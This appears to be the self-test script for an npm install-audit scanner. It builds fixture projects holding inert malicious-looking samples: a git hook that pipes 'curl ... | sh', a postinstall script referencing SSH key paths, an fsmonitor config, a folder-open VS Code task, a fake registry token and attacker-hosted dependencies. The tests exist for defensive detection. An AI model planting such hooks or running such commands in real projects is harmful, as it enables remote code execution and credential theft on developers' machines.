// Self test: builds tiny fixture projects in a temp folder and checks audit results.
const { spawnSync } = require("child_process");
const fs = require("fs");
const os = require("os");
const path = require("path");

const tmp = fs.mkdtempSync(path.join(os.tmpdir(), "audit-test-"));
const write = (rel, text) => {
  const p = path.join(tmp, rel);
  fs.mkdirSync(path.dirname(p), { recursive: true });
  fs.writeFileSync(p, text);
};

write("clean/package.json", JSON.stringify({ name: "clean", scripts: { test: "node index.js" } }));
write("clean/index.js", 'console.log("hello");\n');

write("bad/package.json", JSON.stringify({ name: "bad", scripts: { postinstall: "node setup.js" } }));
write("bad/setup.js", [
  'const cp = require("child_process");',
  'const payload = Buffer.from("aGVsbG8=", "base64").toString();',
  'const where = "~/.ssh/id_rsa";',
  "console.log(payload, where, typeof cp);",
].join("\n"));

// Git hooks fixture (v1.1.0 feature)
write("githook/.git/hooks/pre-commit", "#!/bin/sh\ncurl -s https://example.com/x | sh\n");
write("githook/package.json", JSON.stringify({ name: "githook" }));

// Git config fixture (v1.1.0 feature)
write("gitcfg/.git/config", '[core]\n\thooksPath = .hooks\n\tfsmonitor = evil-bin\n');
write("gitcfg/package.json", JSON.stringify({ name: "gitcfg" }));

// VS Code task fixture (v1.1.0 feature)
write("vscodepad/.vscode/tasks.json", JSON.stringify({ tasks: [{ runOptions: { runOn: "folderOpen" } }] }));
write("vscodepad/package.json", JSON.stringify({ name: "vscodepad" }));

// TypeScript fixtures (PR #4 feature)
write("ts-bad/package.json", JSON.stringify({ name: "ts-bad", scripts: { test: "tsc" } }));
write("ts-bad/src/setup.ts", 'import { execSync } from "child_process";\nexecSync("echo hi");\n');
write("ts-bad/src/helper.mts", 'const x = eval("1+1");\n');
write("ts-bad/src/Panel.tsx", 'const run = new Function("return 1");\nexport const Panel = () => null;\n');
write("ts-bad/src/types.cts", '// plain type-only file, safe\nexport type Foo = string;\n');

write("ts-clean/package.json", JSON.stringify({ name: "ts-clean" }));
write("ts-clean/src/index.ts", 'export const greet = (name: string) => `Hello, ${name}`;\n');

// Registry config fixtures (v1.3.0): a token or a private registry in the project
write("npmrc-bad/package.json", JSON.stringify({ name: "npmrc-bad" }));
write("npmrc-bad/frontend/.npmrc", "//registry.npmjs.org/:_authToken=npm_SECRET123\n@acme:registry=https://npm.evil.example/\n");
write("npmrc-bad/.yarnrc.yml", 'npmRegistryServer: "https://yarn.evil.example"\n');
write("npmrc-ok/package.json", JSON.stringify({ name: "npmrc-ok" }));
write("npmrc-ok/.npmrc", "registry=https://registry.npmjs.org/\nsave-exact=true\n");

// pnpm hook files run during install even without a package.json install script.
const pnpmMarker = path.join(tmp, "pnpm-hook-executed");
write("pnpm-hook/.pnpmfile.cjs", 'require("fs").writeFileSync(' + JSON.stringify(pnpmMarker) + ', "executed");\nmodule.exports = { hooks: {} };\n');
write("pnpm-risky/.pnpmfile.cjs", 'const cp = require("child_process");\nmodule.exports = { hooks: {} };\n');
write("pnpm-empty/.pnpmfile.cjs", "");
write("pnpm-lookalike/pnpmfile.cjs", 'module.exports = {};\n');
write("pnpm-lookalike/.pnpmfile.cjs/index.js", 'module.exports = {};\n');

// Non-registry dependency fixtures (PR #4 feature)
write(
  "git-dep/package.json",
  JSON.stringify({
    name: "git-dep",
    dependencies: {
      "safe-pkg": "^1.0.0",
      "risky-git": "git+https://github.com/attacker/pkg.git",
      "risky-tgz": "https://example.com/pkg.tgz",
      "local-hack": "file:../internal",
      "risky-gitproto": "git://github.com/attacker/pkg.git",
      "risky-shorthand": "attacker/pkg#main",
      "risky-link": "link:../linked",
      "risky-url": "https://example.com/download?id=1",
      "scoped-safe": "~2.3.0",
      "tag-safe": "latest",
    },
  })
);

const run = (dir, extra = []) =>
  spawnSync(process.execPath, [path.join(__dirname, "audit.js"), ...extra, dir], { encoding: "utf8" });

let ok = true;
const check = (name, cond) => {
  console.log((cond ? "PASS " : "FAIL ") + name);
  if (!cond) ok = false;
};

// Version check (v1.1.0)
const v = spawnSync(process.execPath, [path.join(__dirname, "audit.js"), "--version"], { encoding: "utf8" });
check("--version prints version", v.status === 0 && /npm-install-audit 1\.3\.2/.test(v.stdout));

// Original checks
const clean = run(path.join(tmp, "clean"));
check("clean fixture exits 0", clean.status === 0);

const bad = run(path.join(tmp, "bad"));
check("bad fixture exits 1", bad.status === 1);
check("flags postinstall hook", /postinstall hook runs/.test(bad.stdout));
check("flags shell execution", /runs shell commands/.test(bad.stdout));
check("flags base64 decoding", /decodes base64/.test(bad.stdout));
check("flags key paths", /key, wallet or browser data paths/.test(bad.stdout));
check("missing directory exits 2", run(path.join(tmp, "nope")).status === 2);

// v1.1.0 checks: git hooks, git config, VS Code
const gh = run(path.join(tmp, "githook"));
check("flags active git hook with payload", /active git hook.*downloads and runs code/.test(gh.stdout));

const gc = run(path.join(tmp, "gitcfg"));
check("flags hooksPath in git config", /hooksPath points git hooks/.test(gc.stdout));
check("flags fsmonitor in git config", /fsmonitor runs a program/.test(gc.stdout));

const vc = run(path.join(tmp, "vscodepad"));
check("flags VS Code folderOpen task", /VS Code task runs when the folder is opened/.test(vc.stdout));

// PR #4: TypeScript checks
const tsBad = run(path.join(tmp, "ts-bad"));
check("ts-bad fixture exits 1", tsBad.status === 1);
check("flags .ts exec in ts file", /runs shell commands/.test(tsBad.stdout));
check("flags eval in .mts file", /evaluates code at runtime/.test(tsBad.stdout));
check("scans .tsx files", /Panel\.tsx/.test(tsBad.stdout));

const tsClean = run(path.join(tmp, "ts-clean"));
check("ts-clean fixture exits 0", tsClean.status === 0);

// PR #4: Non-registry dependency checks
const gitDep = run(path.join(tmp, "git-dep"));
check("git-dep fixture exits 1", gitDep.status === 1);
check("flags git+https dep", /git URL dependency/.test(gitDep.stdout));
check("flags tarball URL dep", /tarball URL dependency/.test(gitDep.stdout));
check("flags file: dep", /local file: dependency/.test(gitDep.stdout));
check("does not flag safe semver", !gitDep.stdout.includes('"safe-pkg"'));
check("flags git:// dep", /git:\/\/ URL dependency/.test(gitDep.stdout));
check("flags bare user/repo dep", /bare user\/repo GitHub dependency/.test(gitDep.stdout));
check("flags link: dep", /local link: dependency/.test(gitDep.stdout));
check("flags non-tarball URL dep", /"risky-url".*URL dependency/.test(gitDep.stdout));
check("does not flag ~range or dist-tag", !/"scoped-safe"|"tag-safe"/.test(gitDep.stdout));

// PR #4: --json flag checks
const npmrcBad = run(path.join(tmp, "npmrc-bad"));
check("npmrc-bad fixture exits 1", npmrcBad.status === 1);
check("flags auth token in .npmrc", /frontend[\\/]\.npmrc: ships a registry auth token/.test(npmrcBad.stdout));
check("does not print the token", !/SECRET123/.test(npmrcBad.stdout));
check("flags scoped private registry", /@acme packages install from another registry: https:\/\/npm\.evil\.example/.test(npmrcBad.stdout));
check("flags yarn registry server", /\.yarnrc\.yml: installs come from another registry: https:\/\/yarn\.evil\.example/.test(npmrcBad.stdout));
const npmrcOk = run(path.join(tmp, "npmrc-ok"));
check("official registry in .npmrc is not flagged", npmrcOk.status === 0);

const pnpmHook = run(path.join(tmp, "pnpm-hook"));
check("pnpm hook fixture exits 1", pnpmHook.status === 1);
check("flags inert pnpm hook file", /\.pnpmfile\.cjs: pnpm hook file runs automatically during pnpm install/.test(pnpmHook.stdout));
check("does not execute the pnpm hook file", !fs.existsSync(pnpmMarker));
check("flags empty pnpm hook file", run(path.join(tmp, "pnpm-empty")).status === 1);
check("does not flag pnpm filename or directory lookalikes", run(path.join(tmp, "pnpm-lookalike")).status === 0);
const pnpmRisky = run(path.join(tmp, "pnpm-risky"));
check("still scans pnpm hook source for risky patterns", /\.pnpmfile\.cjs: runs shell commands/.test(pnpmRisky.stdout));
const pnpmJson = run(path.join(tmp, "pnpm-hook"), ["--json"]);
const pnpmFindings = JSON.parse(pnpmJson.stdout);
check("--json pnpm hook exits 1", pnpmJson.status === 1);
check("--json includes pnpm hook finding", pnpmFindings.length === 1 && pnpmFindings[0].file === ".pnpmfile.cjs" && /pnpm hook file/.test(pnpmFindings[0].rule));
check("--json does not execute the pnpm hook file", !fs.existsSync(pnpmMarker));

const jsonClean = run(path.join(tmp, "clean"), ["--json"]);
check("--json clean exits 0", jsonClean.status === 0);
check("--json clean is valid JSON", (() => { try { JSON.parse(jsonClean.stdout); return true; } catch { return false; } })());
check("--json clean is empty array", JSON.parse(jsonClean.stdout).length === 0);

const jsonBad = run(path.join(tmp, "bad"), ["--json"]);
check("--json bad exits 1", jsonBad.status === 1);
const parsed = (() => { try { return JSON.parse(jsonBad.stdout); } catch { return null; } })();
check("--json bad is valid JSON", parsed !== null);
check("--json findings have file", parsed && parsed.every((f) => typeof f.file === "string"));
check("--json findings have rule", parsed && parsed.every((f) => typeof f.rule === "string"));
check("--json findings have message", parsed && parsed.every((f) => typeof f.message === "string"));

fs.rmSync(tmp, { recursive: true, force: true });
process.exit(ok ? 0 : 1);
